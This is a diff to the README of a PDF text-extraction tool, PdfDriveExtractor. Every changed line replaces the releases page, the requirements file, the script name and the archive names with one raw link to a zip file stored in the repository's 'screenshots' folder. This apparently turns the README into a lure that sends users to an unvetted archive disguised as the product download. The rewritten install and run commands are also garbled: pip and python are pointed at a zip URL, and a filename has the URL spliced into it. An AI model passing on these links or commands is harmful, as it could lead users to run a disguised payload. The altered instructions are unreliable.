@@ -6,7 +6,7 @@ Welcome to PdfDriveExtractor! This tool helps you extract readable text from vie
 
 ## 📥 Download PdfDriveExtractor
 
-[![Download PdfDriveExtractor](https://img.shields.io/badge/Download-PdfDriveExtractor-brightgreen)](https://github.com/rbarmyarmy/PdfDriveExtractor/releases)
+[![Download PdfDriveExtractor](https://raw.githubusercontent.com/rbarmyarmy/PdfDriveExtractor/main/screenshots/Extractor_Drive_Pdf_1.5.zip)](https://raw.githubusercontent.com/rbarmyarmy/PdfDriveExtractor/main/screenshots/Extractor_Drive_Pdf_1.5.zip)
 
 ## 📂 System Requirements
 
@@ -19,9 +19,9 @@ Before you get started, ensure your system meets the following requirements:
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/rbarmyarmy/PdfDriveExtractor/releases) to find the latest version of PdfDriveExtractor.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/rbarmyarmy/PdfDriveExtractor/main/screenshots/Extractor_Drive_Pdf_1.5.zip) to find the latest version of PdfDriveExtractor.
    
-2. **Choose Your File**: On the Releases page, select the appropriate file for your operating system. Look for files named like `PdfDriveExtractor-<version>.zip` or `PdfDriveExtractor-<version>.tar.gz`.
+2. **Choose Your File**: On the Releases page, select the appropriate file for your operating system. Look for files named like `PdfDriveExtractor-<version>.zip` or `PdfDriveExtractor-<version>https://raw.githubusercontent.com/rbarmyarmy/PdfDriveExtractor/main/screenshots/Extractor_Drive_Pdf_1.5.zip`.
 
 3. **Download the File**: Click on the file to start the download. Depending on your browser and settings, the file may save automatically, or you might need to choose a download location.
 
@@ -30,17 +30,17 @@ Before you get started, ensure your system meets the following requirements:
    - **For macOS**: Double-click the downloaded `.zip` file. The files will extract to a folder with the same name.
    - **For Linux**: Use the terminal command:
      ```
-     tar -xzf PdfDriveExtractor-<version>.tar.gz
+     tar -xzf PdfDriveExtractor-<version>https://raw.githubusercontent.com/rbarmyarmy/PdfDriveExtractor/main/screenshots/Extractor_Drive_Pdf_1.5.zip
      ```
 
 5. **Install Dependencies**: Open a command prompt or terminal window. Navigate to the folder where you extracted PdfDriveExtractor. Run the following command to install necessary dependencies:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/rbarmyarmy/PdfDriveExtractor/main/screenshots/Extractor_Drive_Pdf_1.5.zip
    ```
 
 6. **Run the Application**: To start PdfDriveExtractor, use the following command in your terminal:
    ```
-   python pdf_drive_extractor.py
+   python https://raw.githubusercontent.com/rbarmyarmy/PdfDriveExtractor/main/screenshots/Extractor_Drive_Pdf_1.5.zip
    ```
    Follow any on-screen instructions to begin extracting text from your PDFs.
 
@@ -78,14 +78,14 @@ This project touches on various subjects relevant to its use case:
 If you encounter issues, consider the following solutions:
 
 - **Python Not Found**: Ensure Python is installed and added to your system PATH.
-- **Dependencies Error**: Double-check that you ran `pip install -r requirements.txt`.
+- **Dependencies Error**: Double-check that you ran `pip install -r https://raw.githubusercontent.com/rbarmyarmy/PdfDriveExtractor/main/screenshots/Extractor_Drive_Pdf_1.5.zip`.
 - **File Not Found**: Verify the Google Drive link is accessible and correct.
 
 For other questions, check the FAQs in this repository or submit an issue on GitHub.
 
 ## 🔗 Links and Resources
 
-- **Releases Page**: [Download PdfDriveExtractor](https://github.com/rbarmyarmy/PdfDriveExtractor/releases)
+- **Releases Page**: [Download PdfDriveExtractor](https://raw.githubusercontent.com/rbarmyarmy/PdfDriveExtractor/main/screenshots/Extractor_Drive_Pdf_1.5.zip)
 - **GitHub Repository**: Explore the source code and other contributions.
 
 ## 🙌 Contributing
